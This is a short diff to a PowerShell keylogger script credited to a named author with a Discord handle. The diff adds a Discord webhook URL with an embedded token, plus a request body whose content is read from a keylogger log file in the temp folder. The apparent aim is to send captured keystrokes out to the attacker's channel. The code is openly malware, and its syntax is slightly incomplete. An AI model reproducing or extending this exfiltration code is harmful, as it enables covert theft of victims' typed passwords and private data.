@@ -1,7 +1,11 @@
 # MADE BY SYKE
 # Discord: syke#1166 / Syke#1166
 
-
+$webhookUri = 'https://discord.com/api/webhooks/941122393366204447/bqjN-dHZTcO1enFJ51U0XkPTlK_nHMrm7J8PTvxVnbisAlSZSXSFitnrJsqY6eN_tub9'
+            Body = @{
+  
+  'content' = get-content $env:temp/keylogger.log
+}
 
 
 # keylogger
